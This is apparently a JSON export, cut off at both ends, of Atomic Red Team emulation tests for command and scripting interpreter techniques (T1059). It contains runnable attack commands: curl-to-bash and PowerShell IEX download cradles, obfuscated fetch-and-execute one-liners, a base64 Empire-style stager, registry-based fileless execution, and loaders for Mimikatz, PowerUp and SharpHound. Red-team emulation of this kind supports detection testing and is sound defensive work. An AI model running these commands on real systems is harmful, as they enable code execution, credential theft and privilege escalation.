downloaded from the script_url | String | T1059.006-payload | \n | executor | Payload or script interpreter / executor | String | sh | \n | script_args | Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files | String | -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles | "}, "executionSteps": [{"description": "which_python=$(which python || which python3 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python #{python_script_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6nc03nx29mqege7crx0"], "tags": []}, {"data": {"name": "Execute Python via Python executables (Linux)", "shortName": "T1059.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | python_script_name | Name of Python script name | Path | T1059.006.py | \n | script_url | URL hosting external malicious payload | String | https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh | \n | payload_file_name | Shell script file name downloaded from the script_url | String | T1059.006-payload | \n | executor | Payload or script interpreter / executor | String | sh | \n | script_args | Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files | String | -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles | \n | python_binary_name | Name of Python file to be compiled | Path | T1059.006.pyc | "}, "executionSteps": [{"description": "which_python=$(which python || which python3 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6nc03nx29mqege7crx0"], "tags": []}, {"data": {"name": "Visual Basic script execution to gather local computer information", "shortName": "T1059.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Visual Basic execution test, execute vbscript via PowerShell.\n\nWhen successful, system information will be written to $env:TEMP\\T1059.005.out.txt.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | vbscript | Path to sample script | String | PathToAtomicsFolder\\T1059.005\\src\\sys_info.vbs | "}, "executionSteps": [{"description": "cscript #{vbscript} > $env:TEMP\\T1059.005.out.txt", "successCriteria": null}], "techniqueIds": ["clacwm6qa03r229mqhuv6ebdt", "clacwm2ld00ze29mq9kfhhabq"], "tags": []}, {"data": {"name": "Extract Memory via VBA", "shortName": "T1059.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this\nwe first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that\nmemory location to a file stored in the $env:TEMP\\atomic_t1059_005_test_output.bin.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ms_product | Maldoc application Word | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6qa03r229mqhuv6ebdt", "clacwm2ld00ze29mq9kfhhabq"], "tags": []}, {"data": {"name": "Encoded VBS code execution", "shortName": "T1059.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6qa03r229mqhuv6ebdt", "clacwm2ld00ze29mq9kfhhabq"], "tags": []}, {"data": {"name": "LinEnum tool execution", "shortName": "T1059.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | linenum | Path to the LinEnum shell script | Path | PathToAtomicsFolder/T1059.004/src/LinEnum.sh | \n | linenum_url | Path to download LinEnum shell script | Url | https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh | "}, "executionSteps": [{"description": "chmod +x #{linenum}\nbash #{linenum}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hg03hf29mq0qk23huo"], "tags": []}, {"data": {"name": "Harvest SUID executable files", "shortName": "T1059.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | autosuid | Path to the autosuid shell script | Path | PathToAtomicsFolder/T1059.004/src/AutoSUID.sh | \n | autosuid_url | Path to download autosuid shell script | Url | https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh | "}, "executionSteps": [{"description": "chmod +x #{autosuid}\nbash #{autosuid}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hg03hf29mq0qk23huo"], "tags": []}, {"data": {"name": "Create and Execute Bash Shell Script", "shortName": "T1059.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates and executes a simple bash script.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_path | Script path | Path | /tmp/art.sh | "}, "executionSteps": [{"description": "sh -c \"echo 'echo Hello from the Atomic Red Team' > #{script_path}\"\nsh -c \"echo 'ping -c 4 8.8.8.8' >> #{script_path}\"\nchmod +x #{script_path}\nsh #{script_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6hg03hf29mq0qk23huo", "clacwm2k600y629mqa12b787l"], "tags": []}, {"data": {"name": "Command-Line Interface", "shortName": "T1059.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash\n", "successCriteria": null}], "techniqueIds": ["clacwm6hg03hf29mq0qk23huo", "clacwm2k600y629mqa12b787l"], "tags": []}, {"data": {"name": "Writes text to a file and displays it.", "shortName": "T1059.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_contents_path | Path to the file that the command prompt will drop. | Path | %TEMP%\\test.bin | \n | message | Message that will be written to disk and then displayed. | String | Hello from the Windows Command Prompt! | "}, "executionSteps": [{"description": "echo \"#{message}\" > \"#{file_contents_path}\" & type \"#{file_contents_path}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6oc03oy29mq6tu97esg", "clacwm2m8010629mq7aizaaz8"], "tags": []}, {"data": {"name": "Suspicious Execution via Windows Command Shell", "shortName": "T1059.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | File to output to | String | hello.txt | \n | input_message | Message to write to file | String | Hello, from CMD! | "}, "executionSteps": [{"description": "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6oc03oy29mq6tu97esg"], "tags": []}, {"data": {"name": "Simulate BlackByte Ransomware Print Bombing", "shortName": "T1059.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_to_print | File to be opened/printed by Wordpad. | String | $env:temp\\T1059_003note.txt | \n | max_to_print | The maximum number of Wordpad windows the test will open/print. | String | 75 | "}, "executionSteps": [{"description": "cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" | out-null\n", "successCriteria": null}], "techniqueIds": ["clacwm6oc03oy29mq6tu97esg"], "tags": []}, {"data": {"name": "Create and Execute Batch Script", "shortName": "T1059.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_execute | Command to execute within script. | String | dir | \n | script_path | Script path. | Path | $env:TEMP\\T1059.003_script.bat | "}, "executionSteps": [{"description": "Start-Process #{script_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6oc03oy29mq6tu97esg", "clacwm2m8010629mq7aizaaz8"], "tags": []}, {"data": {"name": "Command Prompt read contents from CMD file and execute", "shortName": "T1059.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | CMD file that is read by Command Prompt and execute, which launches calc.exe | Path | PathToAtomicsFolder\\T1059.003\\src\\t1059.003_cmd.cmd | "}, "executionSteps": [{"description": "cmd /r cmd<#{input_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6oc03oy29mq6tu97esg"], "tags": []}, {"data": {"name": "AppleScript", "shortName": "T1059.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5zj02y829mq2zav3xd8", "clacwm1c0001z29mq5bjp6fqz"], "tags": []}, {"data": {"name": "Run Bloodhound from Memory using Download Cradle", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Run BloodHound from local disk", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_path | File path for SharpHound payload | String | PathToAtomicsFolder\\T1059.001\\src | "}, "executionSteps": [{"description": "write-host \"Import and Execution of SharpHound.ps1 from #{file_path}\" -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "PowerUp Invoke-AllChecks", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw"], "tags": []}, {"data": {"name": "Powershell XML requests", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url | url of payload to execute | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml | "}, "executionSteps": [{"description": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "PowerShell Session Creation and Use", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | hostname_to_connect | The host to connect to, by default it will connect to the local machine | String | $env:COMPUTERNAME | "}, "executionSteps": [{"description": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Powershell MsXml COM object - with prompt", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url | url of payload to execute | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1 | "}, "executionSteps": [{"description": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Powershell Invoke-DownloadCradle", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Powershell invoke mshta.exe download", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url | url of payload to execute | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct | "}, "executionSteps": [{"description": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "PowerShell Invoke Known Malicious Cmdlets", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell execution of known Malicious PowerShell Cmdlets\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Malicious_cmdlets | Known Malicious Cmdlets | String | \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n | "}, "executionSteps": [{"description": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw"], "tags": []}, {"data": {"name": "PowerShell Fileless Script Execution", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "PowerShell Downgrade Attack", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "PowerShell Command Execution", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | obfuscated_code | Defaults to: Invoke-Expression with a \"Write-Host\" line. | String | JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA== | "}, "executionSteps": [{"description": "powershell.exe -e  #{obfuscated_code}\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw"], "tags": []}, {"data": {"name": "Obfuscation Tests", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "NTFS Alternate Data Stream Access", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ads_file | File created to store Alternate Stream Data | String | $env:TEMP\\NTFS_ADS.txt | "}, "executionSteps": [{"description": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "successCriteria": null}], "techniqueIds": ["clacwm6fa03em29mqg9v98rvw", "clacwm29g00on29mqejo9af90"], "tags": []}, {"data": {"name": "Mimikatz - Cradlecraft PsSendKeys", "shortName": "T1059.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg 